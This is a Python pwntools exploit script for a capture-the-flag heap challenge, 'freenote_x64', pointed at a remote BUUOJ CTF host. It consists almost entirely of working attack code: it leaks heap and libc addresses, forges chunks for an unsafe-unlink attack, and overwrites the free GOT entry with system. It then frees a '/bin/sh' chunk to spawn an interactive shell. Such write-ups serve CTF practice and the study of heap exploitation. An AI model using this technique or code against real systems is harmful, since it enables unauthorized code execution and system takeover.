import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='freenote_x64'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',28691)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Length of new note: ',str(a))
			io.sendafter('Enter your note: ',c)

		def delete(a):
			io.sendlineafter('Your choice: ','4')
			io.sendlineafter('Note number: ',str(a))

		def edit(a,b,c):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('Note number: ',str(a))
			io.sendlineafter('Length of note: ',str(b))
			io.sendafter('Enter your note: ',c)

		def show():
			io.sendlineafter('Your choice: ','1')
		


		add(1, 'a')
		add(1, 'a')
		add(1, 'a')
		add(1, 'a')
		 
		delete(0)
		delete(2)
		 
		add(8, '12345678')
		add(8, '12345678')
		 
		show()
		io.recvuntil("0. 12345678")
		heap = u64(io.recvline().strip("\x0a").ljust(8, "\x00")) - 0x1940
		io.recvuntil("2. 12345678")
		libcbase = u64(io.recvline().strip("\x0a").ljust(8, "\x00")) - 0x3c4b78
		 
		log.info("heap: %s" % hex(heap))
		log.info("libc_base: %s" % hex(libcbase))
		 
		delete(3)
		delete(2)
		delete(1)
		delete(0)
		 
		#double link
		# gdb.attach(p)
		payload01  = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10)
		payload01 += "A"*0x30 + p64(0x50) + p64(0x20)
		add(len(payload01), payload01)
		 
		payload02  = "A"*0x80 + p64(0x110) + p64(0x90) + "A"*0x80
		payload02 += p64(0) + p64(0x71) + "A"*0x60
		add(len(payload02), payload02)
		delete(2)
		 
		 
		 
		#change
		 
		free_got = elf.got['free']
		system = libcbase + libc.symbols['system']
		 
		payload03 = p64(8) + p64(0x1) + p64(0x8) + p64(free_got) + "A"*0x40
		payload04 = p64(system)
		 
		#
		edit(0, 0x60, payload03)
		edit(0, 0x8, payload04)
		 
		payload05 = "/bin/sh\x00"
		add(len(payload05), payload05)
		delete(4)
		# pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue